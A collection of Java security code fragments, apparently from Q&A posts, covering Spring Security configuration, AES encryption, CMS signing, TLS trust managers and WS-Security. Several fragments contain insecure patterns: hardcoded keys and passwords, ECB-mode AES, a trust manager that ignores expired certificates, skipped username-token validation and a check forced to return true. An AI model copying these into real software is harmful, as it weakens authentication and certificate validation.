---UNIQUEIDFORSNIP---|125972526|    for (Realm realm : ((RealmSecurityManager) SecurityUtils.getSecurityManager()).getRealms())
        System.out.println(realm.getName());
---UNIQUEIDFORSNIP---|126100378|		package security.symmatric;
		
		import javax.crypto.Cipher;
		import javax.crypto.spec.SecretKeySpec;
		
		import org.apache.commons.codec.binary.Base64;
		
		public class AES {
			public static String symmetricEncrypt(String text, String secretKey) {
			    byte[] raw;
			    String encryptedString;
			    SecretKeySpec skeySpec;
			    byte[] encryptText = text.getBytes();
			    Cipher cipher;
			    try {
			        raw = Base64.decodeBase64(secretKey);
			        skeySpec = new SecretKeySpec(raw, "AES");
			        cipher = Cipher.getInstance("AES");
			        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
			        encryptedString = Base64.encodeBase64String(cipher.doFinal(encryptText));
			    } 
			    catch (Exception e) {
			        e.printStackTrace();
			        return "Error";
			    }
			    return encryptedString;
			}
			
			public static String symmetricDecrypt(String text, String secretKey) {
			    Cipher cipher;
			    String encryptedString;
			    byte[] encryptText = null;
			    byte[] raw;
			    SecretKeySpec skeySpec;
			    try {
			        raw = Base64.decodeBase64(secretKey);
			        skeySpec = new SecretKeySpec(raw, "AES");
			        encryptText = Base64.decodeBase64(text);
			        cipher = Cipher.getInstance("AES");
			        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
			        encryptedString = new String(cipher.doFinal(encryptText));
			    } catch (Exception e) {
			        e.printStackTrace();
			        return "Error";
			    }
			    return encryptedString;
			}
			
			public static void main(String[] args) {
				String secretKey = "XMzDdG4D03CKm2IxIWQw7g==";
				String value1= "ABCD";
				String enctypedValue1= "3uweh4pzoVyH1uODQmVNJA==";
				String enctypedValue2= "37PTC20w4DMZYjG3f+GWepSvAbEJUccMXwS/lXilLav1qM/PrCTdontw5/82OdC1zzyhDEsFVRGo rV6gXAQcm+Zai15hliiUQ8l8KRMtUl4=";
				String value4= "20000";
		
				/**  Ecnryption and decryption of value1 **/
				String encryptedValue1= symmetricEncrypt(value1, secretKey);
				String decryptedValue1 = symmetricDecrypt(encryptedValue1, secretKey);
				System.out.println(decryptedValue1);
		
				/**  Decryption of  enctypedValue1 **/
				String decryptedValue2 = symmetricDecrypt(enctypedValue1, secretKey);
				System.out.println(decryptedValue2);
		
				/**  Decryption of  enctypedValue2 **/
				String decryptedValue3 = symmetricDecrypt(enctypedValue2, secretKey);
				System.out.println(decryptedValue3);
		
				/**  Ecnryption and decryption of value4 **/
				String encryptedValue4= symmetricEncrypt(value4, secretKey);
				String decryptedValue4 = symmetricDecrypt(encryptedValue4, secretKey);
				System.out.println(decryptedValue4);
			}
		}
---UNIQUEIDFORSNIP---|126143286|    <security:intercept-url pattern="/admin/get" access="ROLE_ADMIN"/>
---UNIQUEIDFORSNIP---|126143290|    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:security="http://www.springframework.org/schema/security"
           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
            http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-4.0.xsd">
    
           <security:global-method-security
                   secured-annotations="enabled" />
           <security:http>
                  <security:form-login />
                  <security:intercept-url pattern="/admin/get" access="ROLE_ADMIN"/>
           </security:http>
           <security:authentication-manager>
                  <security:authentication-provider>
                         <security:user-service>
                                <security:user name="alpha" authorities="ROLE_ADMIN"
                                               password="password" />
                                <security:user name="beta" authorities="ROLE_USER"
                                               password="password" />
                         </security:user-service>
                  </security:authentication-provider>
           </security:authentication-manager>
    </beans>
---UNIQUEIDFORSNIP---|126220073|    <%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags" %>
    <sec:authorize access="hasRole('supervisor')">
    
    This content will only be visible to users who have
    the "supervisor" authority in their list of <tt>GrantedAuthority</tt>s.
    
    </sec:authorize>
---UNIQUEIDFORSNIP---|126294262|Disabled indicates an account has been administratively or automatically disabled for some reason. Usually some action is required to release it.
Locked indicates an account has been automatically suspended due to invalid login attempts. Usually the passage of time or (less often) requesting manual unlocking is required to release it.
The distinction is not used by Acegi Security code aside from providing more informative errors to the user. There is also an order in which different exceptions should be returned, so that a disabled or locked account for instance will not return a bad credentials exception. Refer to the JavaDocs for more details.
---UNIQUEIDFORSNIP---|126405206|    public class SignedDataTest {
      ... see Part 1
      
    	private static void verify(Path signedFile, Path extractToFile) throws Exception {
    	    FileInputStream fis = new FileInputStream(signedFile.toFile());
    	
    	    DigestCalculatorProvider build = new JcaDigestCalculatorProviderBuilder().setProvider("BC").build();
    	    CMSSignedDataParser sp = new CMSSignedDataParser(build, fis);
    	
    	    // we have to read the whole stream sp.getSignedContent().getContentStream()
    	    // just copy it to the target file
    	    Files.copy(sp.getSignedContent().getContentStream(), extractToFile, StandardCopyOption.REPLACE_EXISTING);
    	    // now we can go on with the other stuff.....
    	    
    	    Store certStore = sp.getCertificates();
    	    // the examples create a new instance of this for each certificate. 
    	    // I don't think that's necessary, but you might want to look into that...
    	    JcaSimpleSignerInfoVerifierBuilder verifier = new JcaSimpleSignerInfoVerifierBuilder().setProvider("BC");
    	
    	    for (Object objSigner : sp.getSignerInfos().getSigners()) {
    	        SignerInformation signer = (SignerInformation) objSigner;
    	        // as I understand it, there should be only one match ....but anyways....
    	        for (Object objMatch : certStore.getMatches(signer.getSID())) {
    	            X509CertificateHolder certHolder = (X509CertificateHolder) objMatch;
    	            System.out.print("verifying against " + certHolder.getSubject().toString());
    	            if (signer.verify(verifier.build(certHolder))) {
    	                System.out.println(": verified");
    	            } else {
    	                System.out.println(": no match");
    	            }
    	        }
    	    }
    	}
    }
---UNIQUEIDFORSNIP---|126405211|    public class SignedDataTest {
    
        private static final File KEYSTORE_FILE = new File("c:\\temp\\Software_View_Certificate_Authority.p12");
        private static final String KEYSTORE_TYPE = "pkcs12";
        private static final char[] KEYSTORE_PWD = "foobar".toCharArray();
        private static final String KEYSTORE_ALIAS = "Software View Certificate Authority";
    
        private static final Path CONTENT_SRC_PATH = Paths.get("c:\\temp\\test.txt");
        private static final Path CONTENT_TARGET_PATH = Paths.get("c:\\temp\\test-retrieved.txt");
        private static final Path SIGNEDDATA_TARGET_PATH = Paths.get("c:\\temp\\test.txt.signed.pkcs7");
    
        public static void main(String[] args) throws Exception {
            Security.addProvider(new BouncyCastleProvider());
            doForth();
            andBack();
        }
    
        private static void doForth() throws Exception {
            KeyStore ks = KeyStore.getInstance(KEYSTORE_TYPE, "BC");
            ks.load(new FileInputStream(KEYSTORE_FILE), KEYSTORE_PWD);
            X500PrivateCredential creds = new X500PrivateCredential(
                    (X509Certificate) ks.getCertificate(KEYSTORE_ALIAS),
                    (PrivateKey) ks.getKey(KEYSTORE_ALIAS, KEYSTORE_PWD)
            );
            createSignature(CONTENT_SRC_PATH, creds, new FileOutputStream(SIGNEDDATA_TARGET_PATH.toFile()));
        }
    
        private static void andBack() throws Exception {
            KeyStore msCertStore = KeyStore.getInstance("Windows-MY", "SunMSCAPI");
            msCertStore.load(null, null);
            SignerInformationVerifier verifier = new JcaSimpleSignerInfoVerifierBuilder().setProvider("SunMSCAPI")
                    .build(((X509Certificate) msCertStore.getCertificate("Software View Certificate Authority")));
            verify(SIGNEDDATA_TARGET_PATH, CONTENT_TARGET_PATH, verifier);
        }
    
        private static void verify(Path signedFile, Path extractToFile, SignerInformationVerifier verifier) throws Exception {
            FileInputStream fis = new FileInputStream(signedFile.toFile());
    
            DigestCalculatorProvider build = new JcaDigestCalculatorProviderBuilder().setProvider("BC").build();
            CMSSignedDataParser sp = new CMSSignedDataParser(build, fis);
    
            // we have to read the whole stream sp.getSignedContent().getContentStream()
            // just copy it to the target file
            Files.copy(sp.getSignedContent().getContentStream(), extractToFile, StandardCopyOption.REPLACE_EXISTING);
            // now we can go on with the other stuff.....
    
            Store certStore = sp.getCertificates();
            // the examples create a new instance of this for each certificate. 
            // I don't think that's necessary, but you might want to look into that...
    
            for (Object objSigner : sp.getSignerInfos().getSigners()) {
                SignerInformation signer = (SignerInformation) objSigner;
                if (signer.verify(verifier)) {
                    System.out.println("verified");
                    // now(!) you want to keep the target content file
                } else {
                    // actually a "org.bouncycastle.cms.CMSSignerDigestMismatchException: message-digest attribute value does not match calculated value"
                    // exception will be thrown in case the contents has been altered
                    // So, you will need a try-catch(-finally?) construct to delete the target contents file in such cases....
                    System.out.println("no match");
                }
            }
        }
    
        private static void createSignature(Path srcfile, X500PrivateCredential creds, FileOutputStream target) throws Exception {
            CMSSignedDataStreamGenerator gen = new CMSSignedDataStreamGenerator() {
                {
                    addSignerInfoGenerator(
                            new JcaSignerInfoGeneratorBuilder(
                                    new JcaDigestCalculatorProviderBuilder().setProvider("BC").build()
                            ).build(
                                    new JcaContentSignerBuilder("SHA1withRSA").setProvider("BC").build(creds.getPrivateKey()),
                                    creds.getCertificate()
                            )
                    );
                    addCertificates(new JcaCertStore(new ArrayList<X509Certificate>() {
                        {
                            add(creds.getCertificate());
                        }
                    }));
                }
            };
            try (OutputStream sigOut = gen.open(target, true)) {
                Files.copy(srcfile, sigOut);
            }
        }
    }
---UNIQUEIDFORSNIP---|126633346|      public class MyRequestHeaderAuthenticationFilter extends RequestHeaderAuthenticationFilter {
        
        	@Override
        	protected void unsuccessfulAuthentication(HttpServletRequest request, HttpServletResponse response,
        			AuthenticationException failed) {
        		super.unsuccessfulAuthentication(request, response, failed);
        
        		// see comments in Servlet API around using sendError as an alternative
        		response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
        	}
        }
---UNIQUEIDFORSNIP---|126752292|    output = new BufferedOutputStream(new FileOutputStream(dest));
---UNIQUEIDFORSNIP---|126752294|    finally
    {
        if (input!=null)
            input.close();
        if (output!=null)
            output.close();
    }
---UNIQUEIDFORSNIP---|126892070|    <plugin>
    	<groupId>org.springframework.boot</groupId>
    	<artifactId>spring-boot-maven-plugin</artifactId>
    </plugin>
---UNIQUEIDFORSNIP---|127105019|    bool allowedMove() {
      return true;
      ... remaining original check code here
    }
---UNIQUEIDFORSNIP---|127288059|    <session-config>
      <cookie-config>
        <secure>true</secure>
        <http-only>true</http-only>
      </cookie-config>
    </session-config>
---UNIQUEIDFORSNIP---|127438419|    JTextField jt=new JTextField("text");
    		jt.addActionListener(new ActionListener(){
    			public void actionPerformed(ActionEvent ae)
    			{
    				System.out.println(ae.getActionCommand());
    			}
    		});
---UNIQUEIDFORSNIP---|127438422|    JPasswordField jt=new JPasswordField("text");
    		jt.setActionCommand("");
    		jt.addActionListener(new ActionListener(){
    			public void actionPerformed(ActionEvent ae)
    			{
    				System.out.println(ae.getActionCommand());
    			}
    		});
---UNIQUEIDFORSNIP---|127702235|    @Configuration
    @Order(1)
    protected static class ApiWebSecurityConfigurationAdapter extends WebSecurityConfigurerAdapter {
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers(HttpMethod.GET, "/admin/actuators/health").permitAll()
                .and()
                    .antMatcher("/admin/actuators/**")
                    .authorizeRequests()
                    .anyRequest()
                    .hasRole("ADMIN")
                    .and()
                    .httpBasic();
        }
    }
---UNIQUEIDFORSNIP---|127790715|    HTTP/1.1 302 Moved Temporarily
    Date: Tue, 21 Mar ....
    ...
    ...
    Location: https://MachineName1.Domain1/base/home?1bqfh
    ob2ym=1
    ...
---UNIQUEIDFORSNIP---|127807368|    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setNamespaceAware(true);
    ...
---UNIQUEIDFORSNIP---|127844381|    Date date = user.getBirthDate();
    date.setMonth(1);  // mutated!
---UNIQUEIDFORSNIP---|127844383|    public Date getBirthDate()
    {return new Date(birthDate.getTime());}  // essentially a clone
---UNIQUEIDFORSNIP---|127882319|    <sec:intercept-url pattern="/**/WEB-INF/**" access="no-access"/>
---UNIQUEIDFORSNIP---|127954783|    // Passwords with only alphabetic characters.
    for (int i = 0; i < 8; i++) {
        System.out.println(RandomStringUtils.randomAlphabetic(8));
    }
    System.out.println("--------");
    // Passwords with alphabetic and numeric characters.
    for (int i = 0; i < 8; i++) {
        System.out.println(RandomStringUtils.randomAlphanumeric(8));
    }
---UNIQUEIDFORSNIP---|127954785|    zXHzaLdG
    oDtlFDdf
    bqPbXVfq
    tzQUWuxU
    qBHBRKQP
    uBLwSvnt
    gzBcTnIm
    yTUgXlCc
    --------
    khDzEFD2
    cHz1p6yJ
    3loXcBau
    F6NJAQr7
    PyfN079I
    8tJye7bu
    phfwpY6y
    62q27YRt
---UNIQUEIDFORSNIP---|127954791|    for (int i = 0; i < 8; i++) {
        System.out.println(RandomStringUtils.random(8, "abcDEF123"));
    }
---UNIQUEIDFORSNIP---|127954795|    D13DD1Eb
    cac1Dac2
    FE1bD2DE
    2ab3Fb3D
    213cFEFD
    3c2FEDDF
    FDbFcc1E
    b2cD1c11
---UNIQUEIDFORSNIP---|128274858|       <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/spring/root-context.xml</param-value>
        </context-param>
---UNIQUEIDFORSNIP---|128274862|       <!-- The definition of the Root Spring Container shared by all Servlets and Filters -->
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>
                         /WEB-INF/spring/root-context.xml
                         /WEB-INF/spring/security-config.xml
            </param-value>
        </context-param>
---UNIQUEIDFORSNIP---|128274866|     <spring.security.version>3.1.0.RELEASE</spring.security.version>
---UNIQUEIDFORSNIP---|128362420|    try {
        ClipboardService cs =
        (ClipboardService)ServiceManager.lookup("javax.jnlp.ClipboardService");
        img = (Image)cs.getContents().getTransferData(DataFlavor.imageFlavor);
    } catch (Exception ex) {
    }
---UNIQUEIDFORSNIP---|128362422|    <?xml version="1.0" encoding="UTF-8"?>
    <jnlp spec="1.6+" href="PasteImage.jnlp">
      <information>
      <title>Paste Image</title>
      <vendor>ABC</vendor>
    </information>
    <resources>
      <java version="1.6+"
          href="http://java.sun.com/products/autodl/j2se" />
      <jar href="PasteImage.jar" main="true"/>
    </resources>
    <applet-desc name="PasteImage"
                 main-class="PasteImageApplet"
                 width="320" height="120">
    </applet-desc>
---UNIQUEIDFORSNIP---|128362424|    <applet width="320" height="120">
    <param name="jnlp_href" value="PasteImage.jnlp" />
    </applet>
---UNIQUEIDFORSNIP---|128510803|    <bean id="cache" class="org.hdiv.session.StateCache" singleton="false" 
      init-method="init">
		<property name="maxSize">
			<value>200</value>
		</property>
	</bean>
---UNIQUEIDFORSNIP---|128518700|    <?xml version="1.0" encoding="UTF-8"?>
    <project xmlns="http://maven.apache.org/POM/4.0.0"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
    
        <groupId>com.spring.security.demoxml</groupId>
        <artifactId>xml-spring-security-demo</artifactId>
        <version>1.0-SNAPSHOT</version>
        <packaging>war</packaging>
        <properties>
            <spring.version>4.3.10.RELEASE</spring.version>
            <spring.security.version>4.2.3.RELEASE</spring.security.version>
        </properties>
    
        <dependencies>
            <dependency>
                <groupId>org.springframework</groupId>
                <artifactId>spring-webmvc</artifactId>
                <version>${spring.version}</version>
            </dependency>
    
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-web</artifactId>
                <version>${spring.security.version}</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-config</artifactId>
                <version>${spring.security.version}</version>
            </dependency>
            <dependency>
                <groupId>org.springframework.security</groupId>
                <artifactId>spring-security-core</artifactId>
                <version>${spring.security.version}</version>
            </dependency>
    
        </dependencies>
    
    
    </project>
---UNIQUEIDFORSNIP---|128518709|    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
             version="3.1">
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>WEB-INF/spring-servlet.xml</param-value>
        </context-param>
        <filter>
            <filter-name>springSecurityFilterChain</filter-name>
            <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        </filter>
        <filter-mapping>
            <filter-name>springSecurityFilterChain</filter-name>
            <url-pattern>/*</url-pattern>
        </filter-mapping>
        <listener>
            <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
        </listener>
        <servlet>
            <servlet-name>spring</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <load-on-startup>1</load-on-startup>
        </servlet>
        <servlet-mapping>
            <servlet-name>spring</servlet-name>
            <url-pattern>/</url-pattern>
        </servlet-mapping>
    </web-app>
---UNIQUEIDFORSNIP---|128518717|    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xmlns:context="http://www.springframework.org/schema/context"
           xmlns:security="http://www.springframework.org/schema/security"
           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security.xsd">
    <context:component-scan base-package="com.mydemo.spring" ></context:component-scan>
    
    <security:http auto-config="true">
        <security:intercept-url pattern="/index" access="permitAll()" />
        <security:intercept-url pattern="/**" access="hasRole('ROLE_Usuario')"></security:intercept-url>
    
        <security:form-login authentication-success-forward-url="/private"
                             default-target-url="/private"
                             username-parameter="username"
                             password-parameter="password"/>
        <security:logout logout-success-url="/login" logout-url="/logout"></security:logout>
        
    </security:http>
        <security:authentication-manager>
            <security:authentication-provider>
                <security:user-service>
                    <security:user name="manuel" password="1234" authorities="ROLE_Usuario" />
                </security:user-service>
            </security:authentication-provider>
        </security:authentication-manager>
    </beans>
---UNIQUEIDFORSNIP---|128518721|    package com.mydemo.spring.controller;
    
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    
    @Controller
    public class MainController {
    
        @RequestMapping(value = "/index")
        public String main(){
            return "index";
        }
    
        @RequestMapping(value = "/private")
        public String getPrivate(){
            return "private";
        }
    }
---UNIQUEIDFORSNIP---|128518724|    package com.mydemo.spring;
    
    
    import org.springframework.context.annotation.Bean;
    import org.springframework.context.annotation.Configuration;
    import org.springframework.web.servlet.config.annotation.DefaultServletHandlerConfigurer;
    import org.springframework.web.servlet.config.annotation.EnableWebMvc;
    import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
    import org.springframework.web.servlet.view.InternalResourceViewResolver;
    
    @Configuration
    @EnableWebMvc
    public class Application extends WebMvcConfigurerAdapter
    {
    
        @Bean
        public InternalResourceViewResolver getViewResolver(){
            InternalResourceViewResolver c = new InternalResourceViewResolver();
            c.setPrefix("/");
            c.setSuffix(".jsp");
            return c;
        }
    
        @Override
        public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer){
            configurer.enable();
    
        }
    }
---UNIQUEIDFORSNIP---|128518726|    <html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
        <title>Document</title>
    </head>
    <body>
    <h1>hi</h1>
    </body>
    </html>
---UNIQUEIDFORSNIP---|128518729|    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Login</title>
    </head>
    <body>
    <form action="/login" method="post">
        <div><label> User Name : <input type="text" name="username"/> </label></div>
        <div><label> Password: <input type="password" name="password"/> </label></div>
        <div><input type="submit" value="Sign In"/></div>
    </form>
    </body>
    </html>
---UNIQUEIDFORSNIP---|128518731|    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    <html>
    <head>
        <title>Title</title>
    </head>
    <body>
    <h1>Private Page</h1>
    </body>
    </html>
---UNIQUEIDFORSNIP---|128523477|    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>
        /WEB-INF/spring/root-context.xml,
        /WEB-INF/spring/security-config.xml
        </param-value>
    </context-param>
---UNIQUEIDFORSNIP---|128523479|    <context:component-scan base-package="pl.piotr.ibank" />
---UNIQUEIDFORSNIP---|128523481|    <context:component-scan base-package="pl.piotr.ibank.dao" />
    <beans:bean id="dataSource"
        class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <beans:property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" />
        <beans:property name="url"
            value="jdbc:oracle:thin:@localhost:1521:HR" />
        <beans:property name="username" value="HR" />
        <beans:property name="password" value="asdfghj" />
    </beans:bean>
    <beans:bean id="sessionFactory"
        class="org.springframework.orm.hibernate4.LocalSessionFactoryBean">
        <beans:property name="dataSource" ref="dataSource">
        </beans:property>
        <beans:property name="annotatedClasses">
            <beans:list>
                <beans:value>pl.piotr.ibank.model.User
                </beans:value>
                <beans:value>pl.piotr.ibank.model.UserRole
                </beans:value>
            </beans:list>
        </beans:property>
        <beans:property name="hibernateProperties">
            <beans:props>
                <beans:prop key="hibernate.dialect">
                    org.hibernate.dialect.OracleDialect
                </beans:prop>
                <beans:prop key="hibernate.show_sql">
                    true
                </beans:prop>
            </beans:props>
        </beans:property>
    </beans:bean>
    <beans:bean id="hibernateTransactionManager"
        class="org.springframework.orm.hibernate4.HibernateTransactionManager">
        <beans:property name="sessionFactory" ref="sessionFactory" />
    </beans:bean>
---UNIQUEIDFORSNIP---|128523483|    <import resource="classpath:/WEB-INF/spring/db-config.xml"/>
    <import resource="classpath:/WEB-INF/spring/security-config.xml"/>
---UNIQUEIDFORSNIP---|128523485|        <?xml version="1.0" encoding="UTF-8"?>
    <web-app version="2.5" xmlns="http://java.sun.com/xml/ns/javaee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">
    
        <!-- The definition of the Root Spring Container shared by all Servlets 
            and Filters -->
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>
            /WEB-INF/spring/root-context.xml
            </param-value>
    
        </context-param>
    
        <!-- Creates the Spring Container shared by all Servlets and Filters -->
        <listener>
            <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
        </listener>
    
        <!-- Processes application requests -->
        <servlet>
            <servlet-name>appServlet</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <init-param>
                <param-name>contextConfigLocation</param-name>
                <param-value>/WEB-INF/spring/appServlet/servlet-context.xml
                </param-value>
            </init-param>
            <load-on-startup>1</load-on-startup>
        </servlet>
    
        <servlet-mapping>
            <servlet-name>appServlet</servlet-name>
            <url-pattern>/</url-pattern>
        </servlet-mapping>
    
        <filter>
            <filter-name>springSecurityFilterChain</filter-name>
            <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        </filter>
    
        <filter-mapping>
            <filter-name>springSecurityFilterChain</filter-name>
            <url-pattern>/*</url-pattern>
        </filter-mapping>
    
    </web-app>
---UNIQUEIDFORSNIP---|128589047|    SoapMessage soapMessage = (SoapMessage) message;
    SOAPMessage doc = getSOAPMessage(soapMessage);
    Element elem = WSSecurityUtil.getSecurityHeader(doc.getSOAPPart(), "");
    // get a BinarySignature tag
    Node binarySignatureTag = elem.getFirstChild();
    BinarySecurity token = new X509Security((Element) binarySignatureTag);
    // a X509Certificate construction
    InputStream in = new ByteArrayInputStream(token.getToken());
    CertificateFactory certFactory = CertificateFactory.getInstance("X.509");
    X509Certificate cert = (X509Certificate)certFactory.generateCertificate(in);
---UNIQUEIDFORSNIP---|128642430|    @Singleton
    public MyUserFilter extends FilterOfTheMonth {
        private final Provider<Authenticator> authProvider;
        @Inject
        MyUserFilter(Provider<Authenticator> auth) {
            this.authProvider = auth;
        }
        public void doFilter(ServletRequest request, ServletResponse response, 
                FilterChain chain) throws java.io.IOException, ServletException {
            try {
                // Authenticate and SET the current user utilizing the request and/or                       
                // session objects
                authProvider.get().authenticateUser(HttpRequest currentRequest);
                // Continue on here along the servlet chain
                ... other processing
            } finally {
                authProvider.get().getRidOfCurrentUser();
            }
        }
    }
---UNIQUEIDFORSNIP---|128667628|    static {
        Map<Class,String[]> map = new HashMap<Class,String[]>();
        map.put(Reflection.class,
            new String[] {"fieldFilterMap", "methodFilterMap"});
        map.put(System.class, new String[] {"security"});
        fieldFilterMap = map;
        methodFilterMap = new HashMap<Class,String[]>();
    }
---UNIQUEIDFORSNIP---|128667631|    Reflection.filterFields(this, getDeclaredFields0(publicOnly));
---UNIQUEIDFORSNIP---|128667633|    public static Field[] filterFields(Class containingClass,
                                       Field[] fields) {
        if (fieldFilterMap == null) {
            // Bootstrapping
            return fields;
        }
        return (Field[])filter(fields, fieldFilterMap.get(containingClass));
    }
---UNIQUEIDFORSNIP---|128970376|        keytool -list -keystore cacerts -storepass changeit
    
---UNIQUEIDFORSNIP---|128970380|        c:\Program Files (x86)\Java\jre[version]\lib\security\
---UNIQUEIDFORSNIP---|129251225|    		String reqXml							= "" ;		
    		
    		String creditCardNumber					= "1234567890128899" ;		
    		
    		reqXml = "<RentalPaymentPref>" +
    		"<PaymentCard CardType=\"1\" CardCode=\"VI\" CardNumber=\""+creditCardNumber+"\" ExpireDate=\"0912\" SeriesCode=\"123\">" +
    		"<CardHolderName>Ruchira kariyawasam</CardHolderName>" +
    		"</PaymentCard>" + 
    		"</RentalPaymentPref>" ;		
    		
    		StringBuffer reqXmlString = new StringBuffer(reqXml.toString());	
    		
    	    short startIndex 	= (short)(reqXml.indexOf("CardNumber")+12);
    	     
    
           if(null!=creditCardNumber && (!creditCardNumber.equals("")))
    	    {
    	    	reqXmlString.replace(startIndex,(startIndex+12),"xxxxxxxxxxxx");	    	
    	    }    
    	
    		System.out.println("reqXmlString---->"+reqXmlString);
    // Remaining file writing code goes here. 
---UNIQUEIDFORSNIP---|129251229|    <RentalPaymentPref>
    <PaymentCard CardType="1" CardCode="VI" CardNumber="xxxxxxxxxxxx8899" ExpireDate="0912" SeriesCode="123">
    <CardHolderName>Ruchira kariyawasam</CardHolderName>
    </PaymentCard>
    </RentalPaymentPref>
---UNIQUEIDFORSNIP---|129312563|    SecurityManager securityManager = System.getSecurityManager();
    try {
     System.setSecurityManager(new DisallowAllSecurityManager());
     Object result = groovyShell.evaluate(expression);
            ...
    } catch (...) {
            ...
    } finally {
            System.setSecurityManager(securityManager);
    }
---UNIQUEIDFORSNIP---|129404134|			WSSecurityEngine secEngine = new WSSecurityEngine();
            WSSConfig wsConfig = WSSConfig.newInstance();
			wsConfig.setProcessor(UsernameToken.TOKEN, new Processor() {
				
				@Override
				public void handleToken(Element arg0, Crypto arg1, Crypto arg2, CallbackHandler arg3, WSDocInfo arg4, Vector arg5, WSSConfig arg6)
						throws WSSecurityException {
					// skip the token processing
					logger.debug("Skipping processing of the username token");
				}
				
				@Override
				public String getId() {
					return null;
				}
			});
			secEngine.setWssConfig(wsConfig);
---UNIQUEIDFORSNIP---|129468627|    // Load CAs from an InputStream
                        // (could be from a resource or ByteArrayInputStream or ...)
                        CertificateFactory cf = CertificateFactory.getInstance("X.509");
                        // From https://www.washington.edu/itconnect/security/ca/load-der.crt
                        AssetManager am = getAssets();
                        InputStream caInput = new BufferedInputStream(am.open("your_cert.crt"));
                        Certificate ca;
                        try {
                            ca = cf.generateCertificate(caInput);
                            System.out.println("ca=" + ((X509Certificate) ca).getSubjectDN());
                        } finally {
                            caInput.close();
                        }
                    // Create a KeyStore containing our trusted CAs
                    String keyStoreType = KeyStore.getDefaultType();
                    KeyStore keyStore = KeyStore.getInstance(keyStoreType);
                    keyStore.load(null, null);
                    keyStore.setCertificateEntry("ca", ca);
                   TrustManager[] trustManagers = tmf.getTrustManagers();
    final X509TrustManager origTrustmanager = (X509TrustManager)trustManagers[0];
    
    TrustManager[] wrappedTrustManagers = new TrustManager[]{
       new X509TrustManager() {
           public java.security.cert.X509Certificate[] getAcceptedIssuers() {
              return origTrustmanager.getAcceptedIssuers();
           }
    
           public void checkClientTrusted(X509Certificate[] certs, String authType) {
               origTrustmanager.checkClientTrusted(certs, authType);
           }
    
           public void checkServerTrusted(X509Certificate[] certs, String authType) {
               try {
                   origTrustmanager.checkServerTrusted(certs, authType);
               } catch (CertificateExpiredException e) {}
           }
       }
    };
    SSLContext sc = SSLContext.getInstance("TLS");
    sc.init(null, wrappedTrustManagers, null);
    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory()); 
 
                 
                    // Tell the URLConnection to use a SocketFactory from our SSLContext
                    AppLog.LogE(getClass().getName(), "Licensing Url is " + request.toString());
                    URL url = new URL(request.toString());
                    HttpsURLConnection urlConnection =
                            (HttpsURLConnection)url.openConnection();
                    urlConnection.setSSLSocketFactory(context.getSocketFactory());
                    InputStream in = urlConnection.getInputStream();
                    String line = "";
                    BufferedReader rd = new BufferedReader(new InputStreamReader(in));
                    while ((line = rd.readLine()) != null) {
                        strResponse += line;
                    }
---UNIQUEIDFORSNIP---|129622291|    Installed providers:
        1: SunRsaSign
        2: SunJSSE
        3: SunEC
        4: SunJCE
        5: SUN
        6: nCipherKM
---UNIQUEIDFORSNIP---|129712723|    $JBOSS_HOME/server/default/lib/
---UNIQUEIDFORSNIP---|129712726|    yourapp/WEB-INF/lib
---UNIQUEIDFORSNIP---|129781772|    Cache-Control: max-age=0, no-cache, must-revalidate
---UNIQUEIDFORSNIP---|129913158|    468 private Object executeMethod(final Method method, 
    469                              final ApplicationContext context,
